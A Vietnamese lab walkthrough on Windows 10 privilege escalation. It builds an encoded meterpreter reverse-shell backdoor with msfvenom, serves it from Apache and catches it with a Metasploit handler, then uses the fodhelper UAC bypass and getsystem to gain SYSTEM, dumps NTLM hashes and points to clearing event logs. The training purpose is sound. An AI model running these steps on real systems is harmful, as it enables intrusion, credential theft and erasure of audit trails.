# Leo thang Đặc quyền

Leo thang đặc quyền là hành vi lạm dụng lỗi, cấu hình sai hoặc sơ suất thiết kế trong hệ điều hành hoặc ứng dụng phần mềm để đạt được quyền truy cao hơn vào tài nguyên mà thường được bảo vệ khỏi ứng dụng hoặc người dùng.

Khi kẻ tấn công giành được quyền truy cập vào hệ thống mục tiêu, họ bắt đầu tìm cách khác nhau để leo thang đặc quyền trong hệ thống. Họ có thể khai thác lỗ hổng, lỗi thiết kế hoặc sơ suất cấu hình trong hệ điều hành hoặc ứng dụng phần mềm trên hệ thống mục tiêu để giành quyền truy cập nâng cao vào tài nguyên mà thường được bảo vệ. Leo thang đặc quyền có thể theo chiều **dọc** hoặc **ngang**.

### Mục tiêu
* Trình bày cách leo thang đặc quyền trên máy nạn nhân bằng cách khai thác lỗ hổng.

### Yêu cầu
* Máy ảo Kali Linux.
* Máy ảo Windows 10.

## Tạo Backdoor
Để tạo file thực thi độc hại, nhập lệnh này và đặt địa chỉ IP Kali vào tùy chọn `LHOST`:

`msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.0.2.42 -f exe > Desktop/Exploit.exe`

Lệnh này sẽ tạo file thực thi Windows có tên **Exploit.exe** và sẽ được lưu trên **desktop** của Kali.

![exploit.exe](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/62f3153c4c87084931d3ec529bde0add9c8bf888/exploitexe.png)

## Chia sẻ file Exploit.exe
**Đầu tiên**, chúng ta cần thiết lập cấu hình apache và thư mục chia sẻ.

### Cấu hình Apache

_Nếu bạn chưa cài đặt apache2, chạy **apt-get install apache2**._

Điều hướng đến thư mục apache2, mở file cấu hình **apache2.conf**, và thêm một dòng mới:
`vim /etc/apache2/apache2.conf`

Thêm dòng mới với lệnh: `servername localhost` và lưu file.

![apache.conf](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/1523fa1d4fdbc682f9908f33a01fbc1e08ba283c/apacheconf.png)

Tạo thư mục mới bên trong thư mục html:
`mkdir /var/www/html/share/`

Thay đổi [quyền](https://www.tutonics.com/2012/12/linux-file-permissions-chmod-umask.html) cho thư mục chia sẻ thành **755**:
`chmod -R 755 /var/www/html/share/`

Thay đổi quyền sở hữu của thư mục đó thành **www-data**:
`chown -R www-data:www-data /var/www/html/share/`

_Để xem cấu hình của tùy chọn chia sẻ, nhập:_
`ls -la /var/www/html/ | grep share`
```
drwxr-xr-x 2 www-data www-data  4096 Dec 18 20:52 share
```

Bây giờ sao chép file độc hại vào vị trí chia sẻ:
`cp /root/Desktop/Test.exe /var/www/html/share/`

Khởi động dịch vụ apache để chạy http server: `service apache2 start`

## Thực hiện Khai thác
Khởi chạy Metasploit Framework bằng cách nhập:

`msfconsole`

Chọn **multi/handler** và đặt payload thành **meterpreter/reverse_tcp**:

`use exploit/multi/handler`
`set payload windows/meterpreter/reverse_tcp`

Đặt **LHOST** thành địa chỉ IP của Kali:

`set LHOST 10.0.2.42`

Bắt đầu khai thác trên nền:

`exploit -j -z`

```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Started reverse TCP handler on 10.0.2.42:4444
```

## Chạy Exploit
Chuyển sang máy **Windows 10**, khởi chạy **trình duyệt** và nhập URL:

`http://10.0.2.42/share/` _(Thay đổi thành địa chỉ IP của Kali của bạn)._

![share-exploit](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/b65a2a5858140f439e8de89c919d452668346884/shareexploit.png)

Nhấp vào **Exploit.exe** để tải file backdoor. Khi file đã được tải, điều hướng đến vị trí tải và mở file để thực thi.

Nếu cửa sổ **Open File - Security Warning** xuất hiện, nhấp vào **Run**.

![Sec Warning](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/87089f69512685222b66d10ab10832f0382538f9/securityWarningWin.png)

Chuyển lại máy Kali. Phiên Meterpreter đã được mở thành công, như hình dưới đây:

```
[*] Sending stage (180291 bytes) to 10.0.2.15
[*] Meterpreter session 1 opened (10.0.2.42:4444 -> 10.0.2.15:49804) at 2019-12-18 21:04:09 -0500
```

Để tương tác với các phiên có sẵn, bạn có thể sử dụng lệnh `sessions` hoặc `sessions -i` để liệt kê các phiên hiện tại đang mở. **Để mở bất kỳ phiên nào, chọn ID bằng lệnh:**

`sessions <ID>`

![sessions](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/2b57cd80a9fdbe2dfd1bf4ad18f9df32f894a256/sessions.png)

## Thiết lập Phiên
[[+] Meterpreter Cheat Sheet](https://www.blueliv.com/downloads/Meterpreter_cheat_sheet_v0.1.pdf)

Mở phiên Meterpreter hiện tại và nhập:

`getuid`
```
meterpreter > getuid
Server username: DESKTOP-ICB2IQ4\dummy
```
Bạn sẽ nhận thấy rằng máy chủ Meterpreter đang chạy với đặc quyền người dùng bình thường. Bạn sẽ không thể thực thi các lệnh (chẳng hạn như `hashdump`, trích xuất hash tài khoản người dùng từ file **SAM**; `clearev`, xóa nhật ký sự kiện từ xa; v.v.) yêu cầu đặc quyền quản trị/root.

Hãy kiểm tra điều này bằng cách thực thi lệnh này:

`run post/windows/gather/smart_hashdump`

```
meterpreter > run post/windows/gather/smart_hashdump

[*] Running module against DESKTOP-ICB2IQ4
[*] Hashes will be saved to the database if one is connected.
[+] Hashes will be saved in loot in JtR password file format to:
[*] /root/.msf4/loot/20191218220106_default_10.0.2.15_windows.hashes_986306.txt
[-] Insufficient privileges to dump hashes!
```
**[-] Insufficient privileges to dump hashes!**

Lệnh không thể trích xuất hash từ file SAM trên Windows 10 và trả về lỗi Insufficient Privileges to dump hashes.

Từ đây, rõ ràng là máy chủ Meterpreter yêu cầu đặc quyền admin để thực hiện các hành động như vậy.

Bây giờ, chúng ta có thể thử leo thang đặc quyền bằng cách sử dụng lệnh `getsystem` cố gắng nâng cao đặc quyền người dùng.

`getsystem -t 1`

_sử dụng kỹ thuật Service - [Named Pipe Impersonation](https://securityintelligence.com/identifying-named-pipe-impersonation-and-other-malicious-privilege-escalation-techniques/) (In Memory/Admin)._

```
meterpreter > getsystem -t 1
[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
```

Lệnh không thể leo thang đặc quyền và trả về lỗi **(Access is Denied).**

Từ kết quả trên, rõ ràng là cấu hình bảo mật của máy Windows 10 đang chặn bạn giành quyền truy cập không giới hạn vào nó.

## Thực hiện Leo thang Đặc quyền

Chúng ta có thể thử bỏ qua cài đặt kiểm soát tài khoản người dùng đang chặn bạn giành quyền truy cập không giới hạn vào máy.

Di chuyển phiên Meterpreter hiện tại sang nền. Chỉ cần nhập `background`.

Sử dụng exploit **bypassuac_fodhelper** cho Windows:
`use exploit/windows/local/bypassuac_fodhelper`

Nhập `options` để xem cấu hình, và bạn sẽ thấy chỉ có cài đặt session, nhập `sessions` để xem ID của phiên meterpreter trước đó và đặt cho exploit hiện tại:

`set SESSION <ID>`

Nhập `run` để khai thác:

![run-bypassuac_fodhelper](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/fd2d00d7a9d552981f6422e0ab4dd04a6fe6d9b5/bypassuac_fodhelper.png)

**Exploit BypassUAC đã bỏ qua thành công cài đặt UAC trên máy Windows 10 và một phiên Meterpreter khác đã được mở.**

Bây giờ, điều đầu tiên là kiểm tra trạng thái User ID hiện tại của Meterpreter bằng lệnh `getuid`. Bạn sẽ thấy rằng máy chủ Meterpreter vẫn đang chạy với **đặc quyền người dùng bình thường**.

`getuid`
```
meterpreter > getuid
Server username: DESKTOP-ICB2IQ4\dummy
```

Tại giai đoạn này, chúng ta sẽ thử lại lệnh `getsystem` với tùy chọn `-t 1`, trong nỗ lực **leo thang đặc quyền**.

`getsystem -i 1`

```
meterpreter > getsystem -i 1

...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
```

**Lần này, lệnh đã leo thang đặc quyền người dùng thành công và trả về thông báo "got system", như hình trên.**

Bây giờ, nhập `getuid` lại.

```
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Phiên meterpreter hiện đang chạy với đặc quyền **SYSTEM** (**NT AUTHORITY\SYSTEM**).

Hãy thử thu thập **hash** nằm trong file **SAM** của Windows 10 bằng cách nhập:

`run post/windows/gather/smart_hashdump`

![getSystem](https://gist.githubusercontent.com/Samsar4/62886aac358c3d484a0ec17e8eb11266/raw/fd2d00d7a9d552981f6422e0ab4dd04a6fe6d9b5/hashdump.png)

Lần này, meterpreter đã trích xuất thành công hash NTLM và hiển thị chúng như hình trên. Do đó, chúng ta đã leo thang đặc quyền thành công bằng cách khai thác lỗ hổng của máy Windows 10.

**Bây giờ bạn có thể thực thi các lệnh như (clearev, xóa nhật ký sự kiện từ xa, v.v.)**
